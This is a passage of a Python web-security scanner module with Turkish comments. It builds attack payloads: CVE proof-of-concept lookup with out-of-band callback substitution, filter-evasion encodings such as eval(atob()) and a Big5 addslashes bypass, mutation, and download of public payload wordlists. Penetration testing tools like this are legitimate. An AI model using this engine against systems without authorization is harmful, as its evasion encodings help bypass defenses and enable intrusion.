        self._load_external(extra_db_path or _CVE_PAYLOAD_PATH)

    def _load_external(self, path: Path) -> None:
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
            if isinstance(data, dict):
                self._map.update(data)
                logger.debug(f"[CVEPayloadMap] {len(data)} CVE yüklendi: {path}")
        except Exception as exc:
            logger.debug(f"[CVEPayloadMap] Harici DB yükleme hatası: {exc!r}")

    def get_payloads(
        self,
        cve_id: str,
        callback_url: str = "{{CALLBACK}}",
    ) -> List[str]:
        """
        CVE ID için PoC payload listesi döndür.

        Parametreler
        ------------
        cve_id       : "CVE-2021-44228" formatında CVE ID
        callback_url : OOB callback URL (Log4Shell, Shellshock için)

        Döndürür
        --------
        List[str] — Hazır PoC payload'lar
        """
        entry = self._map.get(cve_id.upper())
        if entry is None:
            logger.debug(f"[CVEPayloadMap] {cve_id} için payload bulunamadı")
            return []
        payloads = list(entry.get("payloads", []))
        # Callback URL yer değiştirme
        return [p.replace("{{CALLBACK}}", callback_url) for p in payloads]

    def get_info(self, cve_id: str) -> Optional[Dict[str, Any]]:
        """CVE hakkında meta bilgi döndür."""
        return self._map.get(cve_id.upper())

    def list_cves(
        self,
        category: Optional[str] = None,
        min_cvss: float = 0.0,
    ) -> List[str]:
        """
        Mevcut CVE ID listesi.

        Parametreler
        ------------
        category  : "rce", "lfi", "ssrf" vb. filtre
        min_cvss  : Minimum CVSS skoru filtresi

        Döndürür
        --------
        List[str] — CVE ID listesi
        """
        result = []
        for cve_id, info in self._map.items():
            if min_cvss and (info.get("cvss", 0) or 0) < min_cvss:
                continue
            if category and info.get("category") != category:
                continue
            result.append(cve_id)
        return sorted(result)

    def get_all_for_category(
        self,
        category: str,
        callback_url: str = "{{CALLBACK}}",
    ) -> Dict[str, List[str]]:
        """
        Belirli kategori için tüm CVE payload'larını döndür.

        Döndürür
        --------
        Dict[str, List[str]] — {cve_id: payloads}
        """
        result: Dict[str, List[str]] = {}
        for cve_id, info in self._map.items():
            if info.get("category") == category:
                payloads = self.get_payloads(cve_id, callback_url)
                if payloads:
                    result[cve_id] = payloads
        return result


# ============================================================================
# 6. Encoding Variant Generator
# ============================================================================

class EncodingVariantGenerator:
    """
    Payload'ları farklı encoding formatlarına dönüştürür.

    Desteklenen encoding'ler
    ------------------------
    - UTF-8    (orijinal)
    - URL      (%XX)
    - Double URL (%25XX)
    - HTML entity (&lt; vb.)
    - Base64   (eval/atob)
    - Unicode  (\\uXXXX)
    - Hex      (\\xXX)
    - UTF-16 LE/BE  (BOM ile)
    - Big5 / GBK    (unicode surrogate attack — opsiyonel)
    - Null byte      (\x00)
    - Tab/newline    (boşluk yerine)
    """

    def generate_all(
        self,
        payload: str,
        encodings: Optional[List[str]] = None,
    ) -> Dict[str, str]:
        """
        Tüm desteklenen encoding varyantlarını üret.

        Döndürür
        --------
        Dict[str, str] — {encoding_name: encoded_payload}
        """
        all_enc = encodings or [
            "url", "double_url", "html", "base64",
            "unicode", "hex", "utf16le",
        ]
        results: Dict[str, str] = {"utf8": payload}

        for enc in all_enc:
            try:
                fn = getattr(self, f"_enc_{enc}", None)
                if fn:
                    results[enc] = fn(payload)
            except Exception as exc:
                logger.debug(f"[Encoding:{enc}] Hata: {exc!r}")

        return results

    def generate_list(
        self,
        payload: str,
        encodings: Optional[List[str]] = None,
    ) -> List[str]:
        """Tüm encoding varyantlarını liste olarak döndür (tekrarsız)."""
        enc_map = self.generate_all(payload, encodings)
        seen: Set[str] = set()
        result: List[str] = []
        for v in enc_map.values():
            if v not in seen:
                seen.add(v)
                result.append(v)
        return result

    # ------------------------------------------------------------------ #
    # Encoding implementasyonları
    # ------------------------------------------------------------------ #

    def _enc_url(self, p: str) -> str:
        return urllib.parse.quote(p, safe="")

    def _enc_double_url(self, p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

    def _enc_html(self, p: str) -> str:
        _map = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "&": "&amp;", "/": "&#x2f;"}
        return "".join(_map.get(c, c) for c in p)

    def _enc_base64(self, p: str) -> str:
        b64 = base64.b64encode(p.encode()).decode()
        return f"eval(atob('{b64}'))"

    def _enc_unicode(self, p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or c in "<>\"';&/" else c for c in p)

    def _enc_hex(self, p: str) -> str:
        return "".join(f"\\x{ord(c):02x}" if ord(c) < 128 and c in "<>\"';&/ " else c for c in p)

    def _enc_utf16le(self, p: str) -> str:
        """UTF-16 LE BOM + encoded bytes -> %XX%XX formatı."""
        raw = p.encode("utf-16-le")
        return "".join(f"%{b:02X}" for b in raw)

    def _enc_big5_bypass(self, p: str) -> str:
        """
        Big5/GBK unicode surrogate saldırısı.
        Ikinci byte 0x5C olan cok-byte karakterlerin ardina
        eklenen ozel karakter kacis mekanizmasini atlatir.
        """
        # 0xBF%27 -> Big5 encoding saldirisi (addslashes bypass)
        return b"\xbf\x27".decode("latin-1") + p.replace("'", b"\xbf\x27".decode("latin-1"))

    def _enc_null_space(self, p: str) -> str:
        """Boşlukları null byte ile değiştir."""
        return p.replace(" ", "\x00")

    def _enc_tab_space(self, p: str) -> str:
        """Boşlukları tab ile değiştir."""
        return p.replace(" ", "\t")


# ============================================================================
# 7. WordlistUpdater
# ============================================================================

class WordlistUpdater:
    """
    Wordlist dosyalarını git veya HTTP üzerinden günceller.

    Desteklenen kaynaklar
    ---------------------
    - Git repository (clone/pull)
    - HTTP download (tek dosya)
    - SecLists gibi büyük koleksiyonlar

    Yerleşik Kaynak Listesi
    -----------------------
    - SecLists (Daniel Miessler)
    - PayloadsAllTheThings
    - FuzzDB
    """

    _BUILTIN_SOURCES: Dict[str, Dict[str, str]] = {
        "seclists": {
            "url": "https://github.com/danielmiessler/SecLists.git",
            "type": "git",
            "target": "seclists",
            "branch": "master",
        },
        "payloadsallthethings": {
            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings.git",
            "type": "git",
            "target": "payloadsallthethings",
            "branch": "master",
        },
        "fuzzdb": {
            "url": "https://github.com/fuzzdb-project/fuzzdb.git",
            "type": "git",
            "target": "fuzzdb",
            "branch": "master",
        },
    }

    def __init__(
        self,
        base_dir: Optional[Path] = None,
        timeout: int = _UPDATER_TIMEOUT,
    ) -> None:
        self.base_dir = base_dir or (_DATA_DIR / "wordlists_ext")
        self.timeout = timeout

    def update_all(
        self,
        sources: Optional[List[str]] = None,
        dry_run: bool = False,
    ) -> Dict[str, Dict[str, Any]]:
        """
        Tüm (veya seçili) kaynak listesini güncelle.

        Parametreler
        ------------
        sources : None -> tüm kaynaklar; list -> sadece bu kaynaklar
        dry_run : True -> sadece rapor ver, dosya değiştirme

        Döndürür
        --------
        Dict[str, Dict] — {source_name: {action, status, message}}
        """
        report: Dict[str, Dict[str, Any]] = {}
        names = sources or list(self._BUILTIN_SOURCES.keys())

        for name in names:
            src = self._BUILTIN_SOURCES.get(name)
            if src is None:
                report[name] = {"action": "skip", "status": "unknown_source"}
                continue

            target_dir = self.base_dir / src["target"]
            if dry_run:
                exists = target_dir.exists()
                report[name] = {
                    "action": "dry_run",
                    "status": "exists" if exists else "missing",
                    "path": str(target_dir),
                }
                continue

            report[name] = self._update_source(name, src, target_dir)

        return report

    def update_source(self, source_name: str) -> Dict[str, Any]:
        """Tek bir kaynağı güncelle."""
        src = self._BUILTIN_SOURCES.get(source_name)
        if src is None:
            return {"status": "error", "message": f"Bilinmeyen kaynak: {source_name}"}
        target_dir = self.base_dir / src["target"]
        return self._update_source(source_name, src, target_dir)

    def _update_source(
        self, name: str, src: Dict[str, str], target_dir: Path
    ) -> Dict[str, Any]:
        url = src["url"]
        src_type = src.get("type", "git")
        branch = src.get("branch", "master")

        self.base_dir.mkdir(parents=True, exist_ok=True)

        if src_type == "git":
            return self._git_sync(name, url, target_dir, branch)
        elif src_type == "http":
            return self._http_download(name, url, target_dir)
        else:
            return {"status": "error", "message": f"Bilinmeyen kaynak tipi: {src_type}"}

    def _git_sync(
        self, name: str, url: str, target: Path, branch: str
    ) -> Dict[str, Any]:
        """Git clone veya pull."""
        try:
            if (target / ".git").exists():
                # Pull
                proc = subprocess.run(
                    ["git", "-C", str(target), "pull", "--ff-only", "--depth=1"],
                    capture_output=True, text=True,
                    timeout=self.timeout, check=False,
                )
                action = "pull"
            elif not target.exists():
                # Clone
                proc = subprocess.run(
                    ["git", "clone", "--depth=1", "--branch", branch,
                     url, str(target)],
                    capture_output=True, text=True,
                    timeout=self.timeout, check=False,
                )
                action = "clone"
            else:
                return {
                    "status": "skip",
                    "message": f"Dizin mevcut ama git repo değil: {target}",
                }

            success = proc.returncode == 0
            return {
                "action": action,
                "status": "ok" if success else "error",
                "message": (proc.stdout or proc.stderr or "")[:300],
            }
        except subprocess.TimeoutExpired:
            return {"action": "git", "status": "timeout", "message": f">{self.timeout}s"}
        except FileNotFoundError:
            return {"action": "git", "status": "error", "message": "git binary bulunamadı"}
        except Exception as exc:
            return {"action": "git", "status": "error", "message": str(exc)[:200]}

    def _http_download(
        self, name: str, url: str, target_dir: Path
    ) -> Dict[str, Any]:
        """HTTP üzerinden tek dosya indir."""
        try:
            import urllib.request
            target_dir.mkdir(parents=True, exist_ok=True)
            filename = url.rsplit("/", 1)[-1] or f"{name}.txt"
            dest = target_dir / filename
            urllib.request.urlretrieve(url, dest)
            return {"action": "download", "status": "ok", "path": str(dest)}
        except Exception as exc:
            return {"action": "download", "status": "error", "message": str(exc)[:200]}

    def status(self) -> Dict[str, Dict[str, Any]]:
        """Tüm kaynakların mevcut durumunu raporla."""
        result: Dict[str, Dict[str, Any]] = {}
        for name, src in self._BUILTIN_SOURCES.items():
            target = self.base_dir / src["target"]
            is_git = (target / ".git").exists()
            exists = target.exists()
            size_mb = 0.0
            if exists:
                try:
                    size_bytes = sum(f.stat().st_size for f in target.rglob("*") if f.is_file())
                    size_mb = round(size_bytes / 1024 / 1024, 1)
                except Exception:
                    pass
            result[name] = {
                "exists": exists,
                "is_git": is_git,
                "path": str(target),
                "size_mb": size_mb,
                "url": src["url"],
            }
        return result


# ============================================================================
# 8. PayloadEngine — Facade
# ============================================================================

class PayloadEngine:
    """
    Tüm payload alt sistemlerini birleştiren Facade sınıfı.

    Sorumluluğu: CMS tespiti -> profil seçimi -> payload yükleme ->
    mutasyon -> encoding -> sıralama -> hazır payload listesi üretimi.

    Kullanım
    --------
    ```python
    engine = PayloadEngine()
    payloads = engine.get(
        category="sqli",
        tech_tags=["WordPress/6.4", "MySQL/8.0"],
        cve_ids=["CVE-2021-44228"],
        apply_mutations=True,
        apply_encoding=True,
        callback_url="https://burp.collaborator.net/x",
        limit=200,
    )
    ```
    """

    def __init__(
        self,
        mutation_engine: Optional[PayloadMutationEngine] = None,
        scorer: Optional[PayloadScorer] = None,
        cve_map: Optional[CVEPayloadMap] = None,
        encoding_gen: Optional[EncodingVariantGenerator] = None,
    ) -> None:
        self.fingerprinter = CMSFingerprinter()
        self.mutator = mutation_engine or PayloadMutationEngine()
        self.scorer = scorer or PayloadScorer()
        self.cve_map = cve_map or CVEPayloadMap()
        self.encoder = encoding_gen or EncodingVariantGenerator()
        self._cache: Dict[str, List[str]] = {}

    # ------------------------------------------------------------------
    # Ana API
    # ------------------------------------------------------------------

    def get(
        self,
        category: str,
        tech_tags: Optional[Iterable[str]] = None,
        base_payloads: Optional[List[str]] = None,
        cve_ids: Optional[List[str]] = None,
        apply_mutations: bool = False,
        apply_encoding: bool = False,
        rank_by_score: bool = True,
        callback_url: str = "{{CALLBACK}}",
        limit: int = 500,
        mutation_variants: int = 5,
    ) -> List[str]:
        """
        Kapsamlı payload listesi üret.

        Parametreler
        ------------
        category         : "sqli", "xss", "rce", "lfi", "ssrf", "ssti" vb.
        tech_tags        : Tespit edilen teknoloji etiketleri
        base_payloads    : Ek temel payload'lar
        cve_ids          : Eklenmesi istenen CVE payload'ları
        apply_mutations  : True -> PayloadMutationEngine ile varyantlar ekle
        apply_encoding   : True -> EncodingVariantGenerator ile encoding varyantları
        rank_by_score    : True -> PayloadScorer ile sıralama yap
        callback_url     : OOB callback URL (Log4Shell vb. için)
        limit            : Maksimum toplam payload sayısı
        mutation_variants: Her payload için maksimum mutant sayısı

        Döndürür
        --------
        List[str] — Hazır payload listesi
        """
        tags = list(tech_tags or [])

        # 1. Base payload'ları al
        all_payloads: List[str] = list(base_payloads or [])

        # 2. CMS-özel payload'lar ekle
        cms = self.fingerprinter.detect(tags)
        if cms:
            cms_payloads = get_cms_payloads(cms, category, limit=50)
            all_payloads = list({*all_payloads, *cms_payloads})
            logger.debug(f"[PayloadEngine] CMS={cms}  +{len(cms_payloads)} özel payload")

        # 3. CVE payload'ları ekle
        for cve_id in (cve_ids or []):
            cve_payloads = self.cve_map.get_payloads(cve_id, callback_url)
            all_payloads.extend(cve_payloads)
            if cve_payloads:
                logger.debug(f"[PayloadEngine] CVE {cve_id}  +{len(cve_payloads)} payload")

        # 4. Genel wordlist'ten yükle (mevcut payloads.py)
        try:
            from websecure.core.payloads import get_payloads as _legacy_get
            wordlist_payloads = _legacy_get(
                category, tech_tags=tags, do_sync=False
            )
            all_payloads.extend(wordlist_payloads)
        except Exception as exc:
            logger.debug(f"[PayloadEngine] Legacy wordlist yükleme hatası: {exc!r}")

        # Dedup
        seen: Set[str] = set()
        unique: List[str] = []
        for p in all_payloads:
            if p and p not in seen:
                seen.add(p)
                unique.append(p)
        all_payloads = unique

        # 5. Mutasyon
        if apply_mutations and all_payloads:
            all_payloads = self.mutator.mutate_all(
                all_payloads,
                max_per_payload=mutation_variants,
                total_limit=limit * 3,
            )

        # 6. Encoding varyantları
        if apply_encoding and all_payloads:
            enc_payloads: List[str] = []
            for p in all_payloads[:min(len(all_payloads), limit // 3)]:
                enc_payloads.extend(self.encoder.generate_list(p))
            all_payloads = list({*all_payloads, *enc_payloads})

        # 7. Skor bazlı sıralama
        if rank_by_score and all_payloads:
            all_payloads = self.scorer.rank(all_payloads, category)

        # 8. Limit uygula
        return all_payloads[:limit]

    def get_cms_paths(
        self,
        tech_tags: Iterable[str],
        include_admin: bool = True,
        include_plugins: bool = True,
    ) -> List[str]:
        """
        Tespit edilen CMS için keşfedilecek path listesi döndür.

        Döndürür
        --------
        List[str] — Endpoint path'leri
        """
        tags = list(tech_tags)
        cms_list = self.fingerprinter.detect_multiple(tags)
        paths: List[str] = []

        for cms in cms_list:
            profile = get_cms_profile(cms)
            if profile is None:
                continue
            paths.extend(profile.extra_paths)
            if include_admin:
                paths.extend(profile.admin_paths)
            if include_plugins:
                paths.extend(profile.plugin_paths)

        return list(dict.fromkeys(paths))  # preserve order, deduplicate

    def record_result(
        self,
        payload: str,
        category: str,
        success: bool,
    ) -> None:
        """Scanner sonucunu scorer'a kaydet."""
        if success:
            self.scorer.record_success(payload, category)
        else:
            self.scorer.record_failure(payload, category)

    def save_scores(self) -> None:
        """Payload skorlarını diske kaydet."""
        self.scorer.save()

    def cve_payloads(
        self,
        cve_id: str,
        callback_url: str = "{{CALLBACK}}",
    ) -> List[str]:
        """Belirli CVE için payload döndür."""
        return self.cve_map.get_payloads(cve_id, callback_url)

    def list_cves(
        self,
        category: Optional[str] = None,
        min_cvss: float = 7.0,
    ) -> List[str]:
        """Yüksek öncelikli CVE listesi."""
        return self.cve_map.list_cves(category=category, min_cvss=min_cvss)


# ---------------------------------------------------------------------------
# Singleton fabrikası
# ---------------------------------------------------------------------------

_engine_instance: Optional[PayloadEngine] = None


def get_engine() -> PayloadEngine:
    """Global PayloadEngine singleton'ı döndür."""
    global _engine_instance
    if _engine_instance is None:
        _engine_instance = PayloadEngine()
    return _engine_instance


# ---------------------------------------------------------------------------
# Kısayol fonksiyonlar (geriye dönük uyumluluk + kolaylık)
# ---------------------------------------------------------------------------

def get_payloads_v2(
    category: str,
    tech_tags: Optional[List[str]] = None,
    cve_ids: Optional[List[str]] = None,
    apply_mutations: bool = False,
    limit: int = 500,
    callback_url: str = "{{CALLBACK}}",
) -> List[str]:
    """
    PayloadEngine üzerinden kapsamlı payload listesi al.

    get_payloads() ile geriye uyumlu; ek parametre destekli.
    """
    return get_engine().get(
        category=category,
        tech_tags=tech_tags,
        cve_ids=cve_ids,
        apply_mutations=apply_mutations,
        limit=limit,
        callback_url=callback_url,
    )


def mutate_payload(payload: str, max_variants: int = 8) -> List[str]:
    """Tekil payload mutasyonu."""
    return PayloadMutationEngine().mutate(payload, max_variants=max_variants)


def encode_payload(payload: str) -> Dict[str, str]:
    """Payload'u tüm encoding formatlarına dönüştür."""
    return EncodingVariantGenerator().generate_all(payload)


def cve_payloads(cve_id: str, callback_url: str = "{{CALLBACK}}") -> List[str]:
    """CVE ID için PoC payload'ları döndür."""
    return CVEPayloadMap().get_payloads(cve_id, callback_url)


def cms_payloads(cms: str, category: str, limit: int = 50) -> List[str]:
    """CMS-özel payload listesi döndür."""
    return get_cms_payloads(cms, category, limit)


def detect_cms(tech_tags: List[str]) -> Optional[str]:
    """Teknoloji etiketlerinden CMS tespit et."""
    return CMSFingerprinter().detect(tech_tags)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

__all__ = [
    # CMS
    "CMSFingerprinter",
    "CMSPayloadProfile",
    "get_cms_profile",
    "get_cms_payloads",
    # Mutasyon
    "MutationStrategy",
    "PayloadMutationEngine",
    "CaseMutation",
    "CommentInjectionMutation",
    "URLEncodingMutation",
    "HTMLEntityMutation",
    "WhitespaceMutation",
    "NullByteMutation",
    "UnicodeEscapeMutation",
    "Base64Mutation",
    "ConcatenationMutation",
    # Skor
    "PayloadScorer",
    # CVE
    "CVEPayloadMap",
    # Encoding
    "EncodingVariantGenerator",
    # Güncelleme
    "WordlistUpdater",
    # Facade
    "PayloadEngine",
    "get_engine",
    # Kısayollar
    "get_payloads_v2",
    "mutate_payload",
    "encode_payload",
    "cve_payloads",
    "cms_payloads",
    "detect_cms",
]
